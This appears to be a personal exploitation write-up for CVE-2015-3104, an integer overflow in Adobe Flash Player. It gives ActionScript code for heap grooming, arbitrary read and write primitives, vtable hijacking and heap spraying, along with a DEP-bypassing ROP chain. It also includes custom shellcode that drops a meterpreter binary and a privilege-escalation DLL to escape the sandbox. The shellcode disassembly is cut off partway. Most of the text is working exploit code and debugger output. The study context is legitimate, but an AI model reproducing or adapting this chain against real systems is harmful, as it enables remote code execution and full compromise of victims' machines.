# [CVE-2015-3104 Adobe Flash Player Integer Overflow](https://www.exploit-db.com/exploits/50290) 

### Overview:

This vulnerability is an interesting integer overflow which leads to a heap overflow. If we are able to control the location of the heap overflow, we can attain arbitrary read and arbitrary write capabilities.

### Debugging

- Use the [DbhFlashVul](https://github.com/blaquee/DbgFlashVul)

- `bc *; !SetBaseAddress 516f0000 ;!SetBpForJitCode JSON$/stringify`, where 516f0000 is the base address of NPSWF32_*** module

- When running the PoC this is the stuff generated by the Windbg extension

    ```
    Call [Function$/createEmptyFunction]
    Call [Object$/_dontEnumPrototype]
    Call [Object$/_init]
    Call [flash.geom::Rectangle]
    Call [flash.display::Stage]
    Call [flash.display::DisplayObjectContainer]
    Call [flash.display::InteractiveObjectVector.<flash.display::Stage3D>]
    Call [flash.display::DisplayObject]
    Call [flash.events::EventDispatcher]
    Call [Exploit]
    Call [flash.display::Sprite]
    Call [flash.utils::ByteArray]
    Call [flash.display::ShaderJobs] var job:ShaderJob = new ShaderJob();
    Call [flash.display::Shader] var shader:Shader = new Shader();
    Call [flash.display::Shader/set byteCode] shader.byteCode = ba;
    ```

- We can use the following commands the set breakpoints in our `.as` file while also finding the output of the values

    ```
    s -a 0 L?80000000 LOG":"Allocated
    ```

### Compiling Actionscript to SWF 

- Download flex_sdk (4.5/4.6 should be fine), can do so via archive.org

- Use mxmlc.exe to compile it

- Need to install Java and add to PATH

### Running the PoC from GPZ

```
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\Macromed\Flash\NPSWF32_16_0_0_296.dll -
eax=41414141 ebx=76f97400 ecx=00004142 edx=00000000 esi=02c2a000 edi=5521bb0c
eip=5489dbde esp=0133e764 ebp=5521bb2c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x69bae:
5489dbde 8b18            mov     ebx,dword ptr [eax]  ds:0023:41414141=????????
```

### Vulnerability 1: Information Leak

We are able to control the location of the heap overflow. Hence, after the heap overflow has occured, we can enumerate the location for the base address of the NPSWF32.dll and for vtables. We do this by allocating strings of "X00U00..". We then free half of the allocations to create holes of 0x18 bytes. When the ShaderJob starts shading, it will look for one of these allocations to copy over the metadata of the shader into one of these "hole"s. Because there is an integer/heap overflow, we will over copy some of the data beyond the shader information. We can iterate through our allocations of "X00U00.."s in order to find an allocation which does not equal to 0x10 to find the corrupted index (`findCorrupted()`). After which, we can locate the exact index of the corrupted location, we can iterate through the corrupted buffer (via `readUnsignedInt()`) till we hit the `0x6230306e` tags, before calculating the actual corrupted bad address via adding 0x16000000 with the offsets obtained via `.position`. The reason why we add to 0x16000000 is because when we first run `readUnsignedInt()`, we will read from the value set at `HERE` which we have set to 0x16000000 (see `Vulnerability 2` for a more in-depth explanation). Moving forward, ee will use 0x16000000 as a reference point as well when we build our arbitrary read and write primatives.

```
/*
    baIn.writeUnsignedInt(0x6230306e);
    baIn.writeUnsignedInt(0x6230306e);
    baIn.writeUnsignedInt(0x41414141); // ptr
    baIn.writeUnsignedInt(0x41414141); // 0x1
    // Offset can be 0x10 bytes
    baIn.writeUnsignedInt(0x16000000); // ptr to data
    baIn.writeUnsignedInt(0xffffffff); // capacity
    baIn.writeUnsignedInt(0x16000000); // length / ptr to data // HERE
    // Another time in case the offset is 0x8 bytes
    baIn.writeUnsignedInt(0xffffffff); // capacity
    baIn.writeUnsignedInt(0xffffffff); // length
*/

private function findCorruptedAddress():void
{
    allocate[corrupted].position = 0;
    allocate[corrupted].endian = "littleEndian";
    while (true)
    {
        if(allocate[corrupted].readUnsignedInt() == 0x6230306e)
        {
            if(allocate[corrupted].readUnsignedInt() == 0x6230306e)
            {
                // Corrupted Object starts just after the second 0x6230306e tag in case the offset is 0x10
                // otherwise after the two 0x41414141 dwords in case the offset is 0x8

                // OFFSET 0x10 LENGTH = 0x16000000
                if (allocate[corrupted].length == 0x16000000)
                    corrupted_ba_pos = allocate[corrupted].position;
                // OFFSET 0x8  LENGTH = 0xffffffff
                else
                    corrupted_ba_pos = allocate[corrupted].position + 0x8;
                // We calculate the address of the corrupted object by using the index
                // and the base address that we set through the heap overflow.
                corrupted_ba_address = 0x16000000 + corrupted_ba_pos;
                // Since every in-use ByteArray object is alternated with a free one
                // (we created the holes), the next in-use ByteArray is at 0x18*2 bytes
                // from the corrupted one.
                next_ba_address = corrupted_ba_address + 0x18*2;
                return;
            }
        }
    }
    return;
}

private function findCorrupted():uint
{
    // Find the corrupted ByteArray::Buffer object.
    // We can find it by checking for a size different from the
    // original 0x10 bytes, since the ByteArray data is 16 bytes
    // for all the objects we allocated, except the corrupted one.
    var i:uint = MAX_ARRAY/2;
    while (i<MAX_ARRAY)
    {
        if (i % 2 == 0)
        {
            if(allocate[i].length != 0x10)
            {
                return i;
            }
        }
        i++;
    }
    return 0;
}
```

### Vulnerability 2: Arbitrary Read 

Given:

```
baIn.writeUnsignedInt(0x41414141);
baIn.writeUnsignedInt(0x42424242);
baIn.writeUnsignedInt(0x43434343); 
baIn.writeUnsignedInt(0x44444444); 
baIn.writeUnsignedInt(0x45454545); <- corrupted_ba_address points to this value (0x16000000 + 0xXXXXXXXX)
baIn.writeUnsignedInt(0x46464646); 
baIn.writeUnsignedInt(0x47474747); <- read starts from here
baIn.writeUnsignedInt(0x48484848); 
baIn.writeUnsignedInt(0x49494949); 
```

Running `allocated[corrupted].length` returns 0x49494949 and running allocated[corrupted].readUnsignedInt() attempts to read and return what 0x47474747 is pointing to (related code: `NPSWF32_17_0_0_188!BrokerMainW+0x953e0`). In this case, 0x47474747 is invalid memory and will hence throw an error. If we set 0x47474747 to 0x16000000, we can start reading what is at 0x16000000 which would be our allocation of "X00U00.."s. If the location of corruption is after 0x16000000, then we can continue reading the byte array from 0x16000000 till we actually find the location of our corrupted bytes. After which, we can dump the actual location of the corrupted bytes and observe that we can find references to NPSWF32.dll and vtables. We can convert this into a arbitrary read function:

```
private function readDword(pAddress:uint):uint
{
    // Read a DWORD from an address
    // by changing the ptr to array of bytes
    var tmpIndex:uint = 0;
    var res:uint = 0;

    // Change ptr to array of bytes
    tmpIndex = (corrupted_ba_address + 0x8) - 0x16000000;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(pAddress);
    allocate[corrupted].position = 0;
    // Read a DWORD from the new address
    res = allocate[corrupted].readUnsignedInt();
    // Reset ptr to array of bytes to 0x16000000
    tmpIndex = (corrupted_ba_address + 0x8) - pAddress;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(0x16000000);
    return res;
}
```

Where `corrupted_ba_address` is the location of our corrupted addresses points to the location at 0x45454545, we first find the corrupted index and store it into tmpIndex. From our byte array stream, we set the position to our corrupted index which points to 0x47474747, before overwriting 0x47474747 with anything we want.

We then set the position back to 0 and read what 0x47474747 is pointing to (which is the starting point of our read from the corrupted index allocate[corrupted].readUnsignedInt() at position 0), and then read what 0x47474747 is pointing to, which has since been updated by the value that we want to read

We basically overwrite the value of 0x47474747 to the pointer which points the address that we want to read (pAddress) stored at `allocate[corrupted].position = tmpIndex`, before setting `allocate[corrupted].position = 0` and calling readUnsignedInt(), before restoring it 0x47474747 back to 0x47474747

### Vulnerability 3: Arbitrary Write

```
private function writeDword(pAddress:uint, value:uint):void
{
    // write a DWORD to an address
    // by changing the ptr to array of bytes
    var tmpIndex:uint = 0;
    // Change ptr to array of bytes
    tmpIndex = (corrupted_ba_address + 0x8) - 0x16000000;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(pAddress);
    allocate[corrupted].position = 0;
    // Read a DWORD from the new address
    allocate[corrupted].writeUnsignedInt(value);
    // Reset ptr to array of bytes to 0x16000000
    tmpIndex = (corrupted_ba_address + 0x8) - pAddress;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(0x16000000);
}
```

Basically same as Arbitrary Read, just that instead of reading from position 0, we will write at position 0. Meaning, we would write at what 0x47474747 is pointing to, which at this point it should be replaced with the value of pAddress.

```
private function writeBytes(pAddress:uint, data:ByteArray):void
{
    // write a ByteArray to an address
    // by changing the ptr to array of bytes
    var tmpIndex:uint = 0;
    // Change ptr to array of bytes
    tmpIndex = (corrupted_ba_address + 0x8) - 0x16000000;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(pAddress);
    allocate[corrupted].position = 0;
    // Read a ByteArray tp the new address
    allocate[corrupted].writeBytes(data, 0, 0);
    // Reset ptr to array of bytes to 0x16000000
    tmpIndex = (corrupted_ba_address + 0x8) - pAddress;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(0x16000000);
}
```

We can also write bytes instead of 4-byte DWORDs

### Exploitation 1: Leaking NPSWF32

Given that we have already leaked the location of our corrupted `baIn` byte array variable, we can use windbg to dump the memory at that location. We can see that at address+0x30, we can see an address which is within the NPSWF32 dll. We can then calculate the offset to give us the base address of NPSWF32 (in the below example, 53ff0000 is the base address).

```
0:012> dd 171a8110 <- From JSON.stringify (version 16.0.0.305)
171a8110  16000000 ffffffff 16000000 ffffffff
171a8120  ffffffff 00000000 171a8158 00000000
171a8130  00000000 00000000 00000000 00000000
171a8140  54c9d144 00000001 171b6000 00001000
171a8150  00000010 00000000 171a8ae8 00000000
171a8160  00000000 00000000 00000000 00000000
171a8170  54c9d144 00000001 171b8000 00001000
171a8180  00000010 00000000 54c9d144 00000001
0:012> ? 54c9d144-53ff0000 
Evaluate expression: 13291844 = 00cad144
```

```
var NPSWF32Ptr:uint = readDword((corrupted_ba_address+0x18*2));
NPSWF32Base = NPSWF32Ptr - 0x00cad144;
```

### Exploitation 2: Leaking Vtable

Next we need to leak a vtable for us to corrupt so that we can obtain code execution. I don't really get how OffSec managed to find out that the virtual table object location is at ptr->to->`corrupted_ba_address`-0x40+0x8 but this method seems stable in both version 17.0.0.188 and 16.0.0.305.

```
...
var tosearch:uint = corrupted_ba_address;
var VTableObj:uint = findVTable(tosearch);
...
private function findVTable(startAddress:uint):uint
{
    // Find the VTable Object Address within the ByteArrayObject
    allocate[corrupted].endian = "littleEndian";
    var addr:uint = 0;
    var base:uint = 0x16000000;
    var bstart:uint = base;
    var count:uint = 0;
    while (true)
    {
        if (readDword(base) == startAddress)
        {
            addr = bstart+count;
            // ByteArray::Buffer pointer is at offset +0x40
            addr = addr - 0x40;
            // VTable Object pointer is at +0x8
            return readDword(addr+0x8);
        }
        else
        {
            base  += 4;
            count += 4;
        }
    }
    return addr;
}
```

### Exploitation 3: Calling Vtable Methods

Using the arbitrary write primative, we can set the virtual function address of the object to 0x42424242 and then trigger the running of the function to control EIP. Again, I don't really know how does OffSec know that the offset from the object is exactly at `+0xd4` but again, this offsets are stable in both version 17.0.0.188 and 16.0.0.305.

```
...
writeDword((VTableObj+0xd4), 0x42424242);
...
gText += allocate[corrupted].toString(); // trigger vtable function
...
```

```
0:008> g
(1780.1644): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\Macromed\Flash\NPSWF32_16_0_0_305.dll - 
eax=170d6298 ebx=00cfe8f0 ecx=42424242 edx=00cfe89c esi=00000010 edi=02eab020
eip=03520393 esp=00cfe888 ebp=00cfe8a0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
03520393 8b4104          mov     eax,dword ptr [ecx+4] ds:0023:42424246=????????
0:000> u eip
03520393 8b4104          mov     eax,dword ptr [ecx+4]
03520396 83ec04          sub     esp,4
03520399 52              push    edx
0352039a 6a00            push    0
0352039c 51              push    ecx
0352039d ffd0            call    eax
```

### Exploitation 4: Heap Spray

Due to the fact that ASLR and DEP being enabled on Flash, we need to do heap spraying and combo it with our vtable hijack attack to obtain code execution. The following heap spray will allow us to allocate memory at `0x1a000000`, `0x1a100000` and `0x1a200000`.

```
import flash.display.MovieClip;
import flash.utils.*;
class spray extends MovieClip
{
	public var allocate:Array;

	public function spray()
	{
		HeapSpray();
	}

	public function HeapSpray() : void
	{
		var chunk_size:uint = 1048576;      // 0x100000
		var block_size:uint = 65536;        // 0x10000
		var heapblocklen:uint = 0;
		var spraychunks:uint = 0;
		var heapblock1:ByteArray;
		var heapblock2:ByteArray;
		var heapblock3:ByteArray;

		heapblock1 = new ByteArray();
		heapblock1.endian = Endian.LITTLE_ENDIAN;

		heapblock1.writeInt(0x41424344);
		heapblocklen = heapblocklen + 4;
		while(heapblocklen < block_size)
		{
			heapblock1.writeByte(0x0d);     // padding to 64K
			heapblocklen = heapblocklen + 1;
		}

		heapblock2 = new ByteArray();

		while(heapblock2.length < chunk_size)
		{
			heapblock2.writeBytes(heapblock1, 0, heapblock1.length);
		}

			allocate = new Array();

		// 600MB spray
		while(spraychunks < 50)
		{
			heapblock3 = new ByteArray();
			heapblock3.writeBytes(heapblock2, 0, heapblock2.length);
			allocate.push(heapblock3);
			spraychunks = spraychunks + 1;
		}
	}
}
```

### Exploitation 5: DEP Bypass via ROP

Since `0x1a000000` points to valid memory, we can start writing our ROP chain here (google for ROP to see how this technique allows you to bypass DEP)

```
private function writeROPChain(NPSWF32Base:uint):void
{

    var ROPaddr:uint = 0x1a00CBE2;

    writeDword(0x1a000004, (NPSWF32Base+0x416400)); 				// 0x10416400: xchg esp, ecx ; or al, 0x00 ; add cl, bl ; retn 0xCBDE ;  (1 found)

    // Save stack information to restore the execution flow after shellcode
    writeDword(0x1a000000, (NPSWF32Base+0x270a58)); 				// 0x10270a58: pop eax ; ret  ;  (1 found)
    writeDword(ROPaddr, 0x1a000400); ROPaddr +=4 ;					// SAVE ECX VALUE HERE
    writeDword(ROPaddr, (NPSWF32Base+0x2688)); ROPaddr +=4 ;	    // 0x10002688: mov dword [eax], ecx ; ret  ;  (1 found)
    writeDword(ROPaddr, (NPSWF32Base+0x270a58)); ROPaddr +=4 ;	    // 0x10270a58: pop eax ; ret  ;  (1 found)
    writeDword(ROPaddr, 0x1a000404); ROPaddr +=4 ;					// SAVE EBX VALUE HERE
    writeDword(ROPaddr, (NPSWF32Base+0x649d7)); ROPaddr +=4 ;	    // 0x100649d7: mov dword [eax], ebx ; pop ebx ; pop ecx ; ret  ;  (1 found)
    writeDword(ROPaddr, 0x41414141); ROPaddr +=4 ;					// JUNK
    writeDword(ROPaddr, 0x42424242); ROPaddr +=4 ;					// JUNK

    // Mona Chain
    writeDword(ROPaddr, (NPSWF32Base+0x3fd20c)); ROPaddr +=4 ;	    // 0x103fd20c: pop ebp ; ret  ;  (1 found)
    writeDword(ROPaddr, (NPSWF32Base+0x3fd20c)); ROPaddr +=4 ;	    // 0x103fd20c: pop ebp ; ret  ;  (1 found)
    writeDword(ROPaddr, (NPSWF32Base+0x76355)); ROPaddr +=4 ;	    // 0x10076355: pop ebx ; ret  ;  (1 found)
    writeDword(ROPaddr, 0x00000201); ROPaddr +=4 ;
    writeDword(ROPaddr, (NPSWF32Base+0x2f2792)); ROPaddr +=4 ;	    // 0x102f2792: pop edx ; ret  ;  (1 found)
    writeDword(ROPaddr, 0x00000040); ROPaddr +=4 ;
    writeDword(ROPaddr, (NPSWF32Base+0xb3560c)); ROPaddr +=4 ;	    // 0x10b3560c: pop ecx ; ret  ;  (1 found)
    writeDword(ROPaddr, (NPSWF32Base+0x00f7e6f5)); ROPaddr +=4 ;	// &Writable location
    writeDword(ROPaddr, (NPSWF32Base+0x1e4d)); ROPaddr +=4 ;	    // 0x10001e4d: pop edi ; ret  ;  (1 found)
    writeDword(ROPaddr, (NPSWF32Base+0x2f4ee)); ROPaddr +=4 ;	    // 0x1002f4ee: nop  ; ret  ;  (1 found)
    writeDword(ROPaddr, (NPSWF32Base+0xa3eb91)); ROPaddr +=4 ;	    // 0x10a3eb91: pop esi ; ret  ;  (1 found)
    writeDword(ROPaddr, (NPSWF32Base+0xda0f)); ROPaddr +=4 ;	    // 0x1000da0f: jmp dword [eax] ;  (1 found)
    writeDword(ROPaddr, (NPSWF32Base+0x1c3cbc)); ROPaddr +=4 ;	    // 0x101c3cbc: pop eax ; ret  ;  (1 found)
    writeDword(ROPaddr, (NPSWF32Base+0x00b7a358)); ROPaddr +=4 ;	// ptr to VirtualProtect IAT
    writeDword(ROPaddr, (NPSWF32Base+0xc958)); ROPaddr +=4 ;	    // 0x1000c958: pushad  ; ret  ;  (1 found)
    writeDword(ROPaddr, (NPSWF32Base+0xbaec3)); ROPaddr +=4 ;	    // 0x100baec3: jmp esp ;  (1 found)

    // NOPsled
    writeDword(ROPaddr, 0x90909090); ROPaddr +=4 ;					// nopsled
    writeDword(ROPaddr, 0x90909090); ROPaddr +=4 ;					// nopsled
    writeDword(ROPaddr, 0x90909090); ROPaddr +=4 ;					// shellcode
...
```

### Exploitation 6: Code Execution

Once we have allocated RWX memory regions via our ROP chain, we can use custom shellcoding in order to obtain code execution. We cannot simply generate a reverse shell via msfvenom and attempt to execute it due to Adobe Flash's sandbox. The amount windows APIs we can use within the sandbox is extremely limited. 

### Exploitation 7: Sandbox Escape

In the course, they comboed this vulnerability with a Symantec Endpoint Local Privilege Escalation vulnerability to escape the sandbox and attain a shell with system privileges. I'm guessing that the LPE vulnerability is exploitable even within the low integrity context of the Adobe Flash Player sandbox. The original exploit uses ActionScript's Base64 Decoder to decode the Base64 encoded LPE DLL, before using the arbitrary write primative to write it to `0x1a200000`. This is similarly done on a meterpreter binary which is written to `0x1a100000` and eventually used by the LPE DLL. However, it was not working for some reason (using flex SDK 4.5/4.6) so I wrote a python script to help convert the binaries into a hex string, and we can use the already developed `hexStringToByteArray()` function to convert it to a byte array before writing it to the various locations.

```
file_path = '<INSERT_FILE_NAME>'

try:
    counter = 0
    finalstring = ""
    with open(file_path, 'rb') as file:
        byte = file.read(1)
        while byte:
            counter += 1
            if hex(ord(byte)) in ["0x0", "0x1", "0x2", "0x3", "0x4", "0x5", "0x6", "0x7", "0x8", "0x9", "0xa", "0xb", "0xc", "0xd", "0xe", "0xf"]:
                temp = hex(ord(byte))[2]
                temp = "0x0"+temp
                #print(temp,end=" ")
            else:
                #print(hex(ord(byte)),end=" ")
                temp = hex(ord(byte))
                
            if len(temp) != 4:
                print("Something messed up")
                break
            
            finalstring += temp[2:]
            byte = file.read(1)
    print("\n\n\n")
    print(finalstring)
    print("\n\n\n")
    print(len(finalstring)/2)
    print(hex(int(len(finalstring)/2)))
except FileNotFoundError:
    print(f"File not found: {file_path}")
except Exception as e:
    print(f"An error occurred: {e}")
```

```
...
dll = hexStringToByteArray(dllString);
met = hexStringToByteArray(metString);
writeBytes(0x1a100000, met);
writeBytes(0x1a200000, dll);
...
```

### Exploitation 8: Custom Shellcoding

This is the shellcode that we came up with:

```
shellcode = { 0x89, 0xE5, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x31, 0xC9, 0x64, 0x8B, 0x71, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x5E, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x66, 0x39, 0x4F, 0x18, 0x75, 0xF2, 0xEB, 0x55, 0x5E, 0x83, 0xEE, 0x54, 0xEB, 0x54, 0x60, 0x8B, 0x43, 0x3C, 0x8B, 0x7C, 0x03, 0x78, 0x01, 0xDF, 0x8B, 0x4F, 0x18, 0x8B, 0x47, 0x20, 0x01, 0xD8, 0x89, 0x45, 0xFC, 0xE3, 0x36, 0x49, 0x8B, 0x45, 0xFC, 0x8B, 0x34, 0x88, 0x01, 0xDE, 0x31, 0xC0, 0x99, 0xFC, 0xAC, 0x84, 0xC0, 0x74, 0x07, 0xC1, 0xCA, 0x0D, 0x01, 0xC2, 0xEB, 0xF4, 0x3B, 0x54, 0x24, 0x24, 0x75, 0xDF, 0x8B, 0x57, 0x24, 0x01, 0xDA, 0x66, 0x8B, 0x0C, 0x4A, 0x8B, 0x57, 0x1C, 0x01, 0xDA, 0x8B, 0x04, 0x8A, 0x01, 0xD8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xE8, 0xA6, 0xFF, 0xFF, 0xFF, 0x68, 0x8E, 0x4E, 0x0E, 0xEC, 0xFF, 0xD6, 0x89, 0x45, 0x10, 0x68, 0xA5, 0x17, 0x00, 0x7C, 0xFF, 0xD6, 0x89, 0x45, 0x14, 0x68, 0x1F, 0x79, 0x0A, 0xE8, 0xFF, 0xD6, 0x89, 0x45, 0x18, 0x68, 0xFB, 0x97, 0xFD, 0x0F, 0xFF, 0xD6, 0x89, 0x45, 0x1C, 0x6A, 0x00, 0x68, 0x2E, 0x65, 0x78, 0x65, 0x68, 0x70, 0x77, 0x6E, 0x64, 0x68, 0x79, 0x6E, 0x63, 0x5C, 0x68, 0x69, 0x63, 0x65, 0x53, 0x68, 0x5C, 0x44, 0x65, 0x76, 0x68, 0x73, 0x6F, 0x66, 0x74, 0x68, 0x69, 0x63, 0x72, 0x6F, 0x68, 0x74, 0x61, 0x5C, 0x4D, 0x68, 0x61, 0x6D, 0x44, 0x61, 0x68, 0x72, 0x6F, 0x67, 0x72, 0x68, 0x43, 0x3A, 0x5C, 0x50, 0x54, 0x59, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x0C, 0x54, 0x58, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x50, 0x6A, 0x03, 0x68, 0x00, 0x00, 0x00, 0x40, 0x51, 0xFF, 0x55, 0x14, 0x89, 0x45, 0x24, 0x6A, 0x00, 0x68, 0x08, 0x04, 0x00, 0x1A, 0x68, 0x4A, 0x20, 0x01, 0x00, 0x68, 0x00, 0x00, 0x10, 0x1A, 0x50, 0xFF, 0x55, 0x18, 0xFF, 0x75, 0x24, 0xFF, 0x55, 0x1C, 0x6A, 0x00, 0x68, 0x2E, 0x64, 0x6C, 0x6C, 0x68, 0x6E, 0x74, 0x65, 0x63, 0x68, 0x73, 0x79, 0x6D, 0x61, 0x68, 0x79, 0x6E, 0x63, 0x5C, 0x68, 0x69, 0x63, 0x65, 0x53, 0x68, 0x5C, 0x44, 0x65, 0x76, 0x68, 0x73, 0x6F, 0x66, 0x74, 0x68, 0x69, 0x63, 0x72, 0x6F, 0x68, 0x74, 0x61, 0x5C, 0x4D, 0x68, 0x61, 0x6D, 0x44, 0x61, 0x68, 0x72, 0x6F, 0x67, 0x72, 0x68, 0x43, 0x3A, 0x5C, 0x50, 0x54, 0x59, 0x89, 0x4D, 0x28, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x0C, 0x54, 0x58, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x50, 0x6A, 0x03, 0x68, 0x00, 0x00, 0x00, 0x40, 0x51, 0xFF, 0x55, 0x14, 0x89, 0x45, 0x24, 0x6A, 0x00, 0x68, 0x08, 0x04, 0x00, 0x1A, 0x68, 0x00, 0x26, 0x00, 0x00, 0x68, 0x00, 0x00, 0x20, 0x1A, 0x50, 0xFF, 0x55, 0x18, 0xFF, 0x75, 0x24, 0xFF, 0x55, 0x1C, 0xFF, 0x75, 0x28, 0xFF, 0x55, 0x10 }
```

The first part of the shellcode basically locates kernel32.dll and creates the function which will search kernel32.dll for functions which matches a given hash as per this [gist](https://github.com/ihack4falafel/ROR13HashGenerator/blob/master/pre_computed_hashes/kernel32.md). This is similar to the content taught in OSED.

```
0:  89 e5                   mov    ebp,esp
2:  81 ec 00 02 00 00       sub    esp,0x200
8:  31 c9                   xor    ecx,ecx
a:  64 8b 71 30             mov    esi,DWORD PTR fs:[ecx+0x30]
e:  8b 76 0c                mov    esi,DWORD PTR [esi+0xc]
11: 8b 76 1c                mov    esi,DWORD PTR [esi+0x1c]
14: 8b 5e 08                mov    ebx,DWORD PTR [esi+0x8]
17: 8b 7e 20                mov    edi,DWORD PTR [esi+0x20]
1a: 8b 36                   mov    esi,DWORD PTR [esi]
1c: 66 39 4f 18             cmp    WORD PTR [edi+0x18],cx
20: 75 f2                   jne    0x14
22: eb 55                   jmp    0x79
24: 5e                      pop    esi
25: 83 ee 54                sub    esi,0x54
28: eb 54                   jmp    0x7e
2a: 60                      pusha
2b: 8b 43 3c                mov    eax,DWORD PTR [ebx+0x3c]
2e: 8b 7c 03 78             mov    edi,DWORD PTR [ebx+eax*1+0x78]
32: 01 df                   add    edi,ebx
34: 8b 4f 18                mov    ecx,DWORD PTR [edi+0x18]
37: 8b 47 20                mov    eax,DWORD PTR [edi+0x20]
3a: 01 d8                   add    eax,ebx
3c: 89 45 fc                mov    DWORD PTR [ebp-0x4],eax
3f: e3 36                   jecxz  0x77
41: 49                      dec    ecx
42: 8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]
45: 8b 34 88                mov    esi,DWORD PTR [eax+ecx*4]
48: 01 de                   add    esi,ebx
4a: 31 c0                   xor    eax,eax
4c: 99                      cdq
4d: fc                      cld
4e: ac                      lods   al,BYTE PTR ds:[esi]
4f: 84 c0                   test   al,al
51: 74 07                   je     0x5a
53: c1 ca 0d                ror    edx,0xd
56: 01 c2                   add    edx,eax
58: eb f4                   jmp    0x4e
5a: 3b 54 24 24             cmp    edx,DWORD PTR [esp+0x24]
5e: 75 df                   jne    0x3f
60: 8b 57 24                mov    edx,DWORD PTR [edi+0x24]
63: 01 da                   add    edx,ebx
65: 66 8b 0c 4a             mov    cx,WORD PTR [edx+ecx*2]
69: 8b 57 1c                mov    edx,DWORD PTR [edi+0x1c]
6c: 01 da                   add    edx,ebx
6e: 8b 04 8a                mov    eax,DWORD PTR [edx+ecx*4]
71: 01 d8                   add    eax,ebx
73: 89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
77: 61                      popa
78: c3                      ret
79: e8 a6 ff ff ff          call   0x24
```

Find the addresses to LoadLibraryA, CreateFileA, WriteFile, and CloseHandle. We will use CreateFileA and WriteFile to write our LPE DLL and meterpreter shells while using LoadLibraryA to actually load the LPE DLL which references the meterpreter shell and executes the kernel exploit to escape the sandbox.

```
7e: 68 8e 4e 0e ec          push   0xec0e4e8e
83: ff d6                   call   esi
85: 89 45 10                mov    DWORD PTR [ebp+0x10],eax
88: 68 a5 17 00 7c          push   0x7c0017a5
8d: ff d6                   call   esi
8f: 89 45 14                mov    DWORD PTR [ebp+0x14],eax
92: 68 1f 79 0a e8          push   0xe80a791f
97: ff d6                   call   esi
99: 89 45 18                mov    DWORD PTR [ebp+0x18],eax
9c: 68 fb 97 fd 0f          push   0xffd97fb
a1: ff d6                   call   esi
a3: 89 45 1c                mov    DWORD PTR [ebp+0x1c],eax
```

After which, we need to write custom shellcode in order to write the DLLs and meterpreter shell onto the target file system, before loading and executing the LPE exploit via `LoadLibrary`.

```
a6: 6a 00                   push   0x0
a8: 68 2e 65 78 65          push   0x6578652e
ad: 68 70 77 6e 64          push   0x646e7770 
b2: 68 79 6e 63 5c          push   0x5c636e79
b7: 68 69 63 65 53          push   0x53656369
bc: 68 5c 44 65 76          push   0x7665445c
c1: 68 73 6f 66 74          push   0x74666f73
c6: 68 69 63 72 6f          push   0x6f726369
cb: 68 74 61 5c 4d          push   0x4d5c6174
d0: 68 61 6d 44 61          push   0x61446d61
d5: 68 72 6f 67 72          push   0x72676f72 
da: 68 43 3a 5c 50          push   0x505c3a43 // C:\ProgramData\microsoft\DeviceSync\*.exe
df: 54                      push   esp
e0: 59                      pop    ecx
e1: 6a 01                   push   0x1
e3: 6a 00                   push   0x0
e5: 6a 0c                   push   0xc
e7: 54                      push   esp
e8: 58                      pop    eax
e9: 6a 00                   push   0x0
eb: 68 80 00 00 00          push   0x80
f0: 6a 02                   push   0x2
f2: 50                      push   eax
f3: 6a 03                   push   0x3
f5: 68 00 00 00 40          push   0x40000000
fa: 51                      push   ecx
fb: ff 55 14                call   DWORD PTR [ebp+0x14] // CreateFile *.exe
fe: 89 45 24                mov    DWORD PTR [ebp+0x24],eax
101: 6a 00                   push   0x0
103: 68 08 04 00 1a          push   0x1a000408
108: 68 4a 20 01 00          push   0x1204a    // number of bytes to write (needs to change)
10d: 68 00 00 10 1a          push   0x1a100000 // lpBuffer to *.exe
112: 50                      push   eax
113: ff 55 18                call   DWORD PTR [ebp+0x18] // WriteFile *.exe
116: ff 75 24                push   DWORD PTR [ebp+0x24]
119: ff 55 1c                call   DWORD PTR [ebp+0x1c] // CloseHandle to fileHandle
11c: 6a 00                   push   0x0
11e: 68 2e 64 6c 6c          push   0x6c6c642e
123: 68 6e 74 65 63          push   0x6365746e  
128: 68 73 79 6d 61          push   0x616d7973 
12d: 68 79 6e 63 5c          push   0x5c636e79 
132: 68 69 63 65 53          push   0x53656369
137: 68 5c 44 65 76          push   0x7665445c
13c: 68 73 6f 66 74          push   0x74666f73
141: 68 69 63 72 6f          push   0x6f726369
146: 68 74 61 5c 4d          push   0x4d5c6174
14b: 68 61 6d 44 61          push   0x61446d61
150: 68 72 6f 67 72          push   0x72676f72
155: 68 43 3a 5c 50          push   0x505c3a43 // C:\ProgramData\microsoft\DeviceSync\*.dll
15a: 54                      push   esp
15b: 59                      pop    ecx
15c: 89 4d 28                mov    DWORD PTR [ebp+0x28],ecx
15f: 6a 01                   push   0x1
161: 6a 00                   push   0x0
163: 6a 0c                   push   0xc
165: 54                      push   esp
166: 58                      pop    eax
167: 6a 00                   push   0x0
169: 68 80 00 00 00          push   0x80
16e: 6a 02                   push   0x2
170: 50                      push   eax
171: 6a 03                   push   0x3
173: 68 00 00 00 40          push   0x40000000
178: 51                      push   ecx
179: ff 55 14                call   DWORD PTR [ebp+0x14]
